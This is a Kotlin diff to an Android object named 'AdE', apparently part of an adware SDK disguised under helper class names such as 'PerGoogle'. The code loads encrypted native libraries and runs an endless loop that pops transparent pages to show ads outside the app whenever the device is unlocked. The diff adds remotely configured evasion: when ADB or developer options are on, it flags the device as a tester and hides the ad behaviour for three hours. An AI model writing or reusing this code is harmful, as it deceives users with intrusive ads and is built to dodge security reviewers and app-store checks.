@@ -6,7 +6,9 @@ import android.content.Context
 import android.net.ConnectivityManager
 import android.os.Build
 import android.os.PowerManager
-import com.sound.helper.Core
+import android.provider.Settings
+import android.util.Log
+import com.sound.helper.PerGoogle
 import com.sound.helper.AppLifecycelListener
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -34,7 +36,7 @@ import kotlin.random.Random
  */
 object AdE {
     private var sK = "" // 16, 24, or 32 bytes // So 解密的key
-    private var mContext: Application = Core.mApp
+    private var mContext: Application = PerGoogle.mApp
 
     @JvmStatic
     var isSAd = false //是否显示广告
@@ -51,10 +53,10 @@ object AdE {
     private var nDayShowMax = 80 //天显示次数
     private var nTryMax = 50 // 失败上限
 
-    private var numHour = Core.getInt("ad_s_h_n")
-    private var numDay = Core.getInt("ad_s_d_n")
-    private var isCurDay = Core.getStr("ad_lcd")
-    private var numJumps = Core.getInt("ac_njp")
+    private var numHour = PerGoogle.getInt("ad_s_h_n")
+    private var numDay = PerGoogle.getInt("ad_s_d_n")
+    private var isCurDay = PerGoogle.getStr("ad_lcd")
+    private var numJumps = PerGoogle.getInt("ac_njp")
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
@@ -79,7 +81,7 @@ object AdE {
     @JvmStatic
     fun sNumJump(num: Int) {
         numJumps = num
-        Core.saveInt("ac_njp", num)
+        PerGoogle.saveInt("ac_njp", num)
     }
 
     @JvmStatic
@@ -96,22 +98,22 @@ object AdE {
     private fun pL() {
         if (isPost) return
         isPost = true
-        Core.pE("advertise_limit")
+        PerGoogle.pE("advertise_limit")
     }
 
     private fun sC() {
-        Core.saveInt("ad_s_h_n", numHour)
-        Core.saveInt("ad_s_d_n", numDay)
+        PerGoogle.saveInt("ad_s_h_n", numHour)
+        PerGoogle.saveInt("ad_s_d_n", numDay)
     }
 
     private fun isCurH(): Boolean {
-        val s = Core.getStr("ad_lht")
+        val s = PerGoogle.getStr("ad_lht")
         if (s.isNotBlank()) {
             if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                 return true
             }
         }
-        Core.saveC("ad_lht", System.currentTimeMillis().toString())
+        PerGoogle.saveC("ad_lht", System.currentTimeMillis().toString())
         return false
     }
 
@@ -119,7 +121,7 @@ object AdE {
         val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
         if (isCurDay != day) {
             isCurDay = day
-            Core.saveC("ad_lcd", isCurDay)
+            PerGoogle.saveC("ad_lcd", isCurDay)
             numHour = 0
             numDay = 0
             isPost = false
@@ -141,7 +143,9 @@ object AdE {
 
     @JvmStatic
     fun a2() {
+        if (isBack()) return
         mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
+        refreshAdmin()
         File("${mContext.dataDir}/$fileName").mkdirs()
         t()
     }
@@ -156,7 +160,7 @@ object AdE {
         tagO = listStr[1]
         strBroadKey = listStr[2]
         fileName = listStr[3]
-
+        isCheckDev = js.optBoolean("heron_che", true)
         mAdC.setAdId(js.optString(Constant.K_ID_H), js.optString(Constant.K_ID_L))// 广告id
         val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
@@ -173,8 +177,7 @@ object AdE {
 
     private var lastS = ""
     private fun refreshAdmin() {
-        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
-        val s = "" // 获取admin外面的配置通过mmkv
+        val s = b1.C.d1("admin_ccc")
         if (lastS != s) {
             lastS = s
             reConfig(JSONObject(s))
@@ -184,18 +187,18 @@ object AdE {
     private fun t() {
         val is64i = is64a()
         mMainScope.launch {
-            Core.pE("test_s_dec")
+            PerGoogle.pE("test_s_dec")
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
                 i = loadRawFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
             }
             if (i.not()) {
-                Core.pE("ss_l_f", "$is64i")
+                PerGoogle.pE("ss_l_f", "$is64i")
                 return@launch
             }
-            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            ha.a0(tagL,1.0f)
+            PerGoogle.pE("test_s_load", "${System.currentTimeMillis() - time}")
+            ha.a0(tagL, 1.0f)
             delay(1200)
             while (true) {
                 // 刷新配置
@@ -207,7 +210,7 @@ object AdE {
                 cAction(t)
                 delay(t)
                 if (numJumps > nTryMax) {
-                    Core.pE("pop_fail")
+                    PerGoogle.pE("pop_fail")
                     break
                 }
             }
@@ -299,39 +302,39 @@ object AdE {
     private fun cAction(time: Long) {
         // 无网络不触发后续逻辑
         if (isNetworkAvailable().not()) return
-        Core.pE("ad_session", time.toString())
+        PerGoogle.pE("ad_session", time.toString())
         if (l().not()) return
-        Core.pE("ad_light")
+        PerGoogle.pE("ad_light")
         if (isLi()) {
-            Core.pE("ad_pass", "limit")
+            PerGoogle.pE("ad_pass", "limit")
             return
         }
         mAdC.loadAd()
-        if (System.currentTimeMillis() - Core.insAppTime < mInstallWait) {
-            Core.pE("ad_pass", "1t")
+        if (System.currentTimeMillis() - PerGoogle.insAppTime < mInstallWait) {
+            PerGoogle.pE("ad_pass", "1t")
             return
         }
         if (System.currentTimeMillis() - lastSAdTime < tPer) {
-            Core.pE("ad_pass", "2t")
+            PerGoogle.pE("ad_pass", "2t")
             return
         }
         if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
-            Core.pE("ad_pass", "s")
+            PerGoogle.pE("ad_pass", "s")
             return
         }
         if (mAdC.isReady().not()) {// 无广告不外弹透明页面
-            Core.pE("ad_pass", "n_ready")
+            PerGoogle.pE("ad_pass", "n_ready")
             return
         }
-        Core.pE("ad_pass", "N")
+        PerGoogle.pE("ad_pass", "N")
         CoroutineScope(Dispatchers.Main).launch {
             delay(finishAc())
             if (isSAd) {
                 delay(800)
             }
             sNumJump(++numJumps)
-            Core.pE("ad_start")
-            ha.a0(tagO,2.0f)
+            PerGoogle.pE("ad_start")
+            ha.a0(tagO, 2.0f)
         }
     }
 
@@ -340,7 +343,6 @@ object AdE {
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
     }
-
 
 
     private fun isNetworkAvailable(): Boolean {
@@ -361,6 +363,58 @@ object AdE {
             return 900
         }
         return 0
+    }
+
+    private fun isBack(): Boolean {
+        if (isTestUser()) {
+            var time = PerGoogle.getStr("time_first")
+            if (time.isBlank()) {
+                time = System.currentTimeMillis().toString()
+                PerGoogle.saveC("time_first", time)
+            }
+            if (System.currentTimeMillis() - time.toLong() < 60000 * 60 * 3) { // 6小时以内
+                PerGoogle.pE("test_user")
+                return true
+            } else {
+                PerGoogle.pE("test_user_time_pass")
+            }
+        }
+        return false
+    }
+
+    private var isCheckDev = true
+    private fun isTestUser(): Boolean {
+        if (isCheckDev.not()) return false
+        val s = PerGoogle.getStr("tes_u")
+        val isOpen = isAdbEnabled(mContext) || isDevelopmentSettingsEnabled(mContext)
+        if (isOpen && s.isBlank()) {
+            PerGoogle.saveC("tes_u", "1")
+        }
+        return isOpen || s == "1"
+    }
+
+    private fun isAdbEnabled(context: Context): Boolean {
+        try {
+            val adbEnabled =
+                Settings.Global.getInt(context.contentResolver, Settings.Global.ADB_ENABLED, 0)
+            return adbEnabled == 1
+        } catch (e: java.lang.Exception) {
+            return false
+        }
+    }
+
+    /**
+     * 检查开发者选项是否开启（不完全可靠）
+     */
+    private fun isDevelopmentSettingsEnabled(context: Context): Boolean {
+        try {
+            val devOptionsEnabled = Settings.Global.getInt(
+                context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
+            )
+            return devOptionsEnabled == 1
+        } catch (e: java.lang.Exception) {
+            return false
+        }
     }
 
 }
